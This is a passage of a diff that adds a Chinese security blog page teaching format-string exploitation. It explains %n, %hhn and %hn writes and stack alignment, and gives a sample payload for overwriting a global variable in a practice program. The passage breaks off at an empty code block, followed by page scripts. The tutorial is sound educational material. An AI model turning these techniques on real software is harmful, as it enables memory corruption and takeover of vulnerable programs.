io.recv()</span><br><span class="line">print(<span class="built_in">str</span>(result))</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602190741457.png"></p>
+<p>payload中%8$n的8是手工栈对齐后的address offset。其后的两个aa是为了实现栈对齐，只有实现栈对齐，才能使用%8$n取到输入的地址。需要手工栈对齐的原因是在地址前面输入了aa%6$n这6个字符，不是4的倍数。</p>
+<p>如果输入：<code>aa%6$n\x24\xa0\x04\x08</code>，gdb调试：</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602195219457.png"></p>
+<p>覆盖的地址的起始地址是0xfffc6cde，不是4的整数倍，不能通过%n$n的方式获取。对齐后：</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602195731284.png"></p>
+<p><strong>覆盖为大数字：</strong></p>
+<p>如果要将变量的值修改为一个较大的数，那么再使用上面提到的%n通过输入很多个字节来进行覆盖的话，会等待较长的时间，甚至会导致程序崩溃。所以这里就需要用其他方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数</span><br></pre></td></tr></table></figure>
+<p><strong>可以利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节。</strong>接下来就利用这种方法修改上面程序中变量b的值为0x12345678，修改成功后程序就会输出：modified b for a big number!。</p>
+<p>首先确定覆盖的地址，变量b也是全局变量，用ida查看b的地址：</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602203126612.png"></p>
+<p>这里以单字节为例：</p>
+<p>要将0x12345678写入变量b所在的内存，payload可以这样构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#格式化字符串" >
+    <span class="tag-code">格式化字符串</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/03/03/HWS%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">
+        <span class="nav-arrow">← </span>
+        
+          HWS赛题复现
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/05/01/CVE-2019-10999/">
+        
+          CVE-2019-10999
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-text">格式化字符串漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-nav-text">格式化字符串漏洞利用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="toc-nav-text">程序崩溃</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-nav-text">泄露栈内存</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-nav-text">泄露任意地址内存</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#x86-64"><span class="toc-nav-text">x86_64</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-nav-text">覆盖栈内存</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-nav-text">覆盖任意地址内存</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/03/14/格式化字符串/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2023 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+    
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
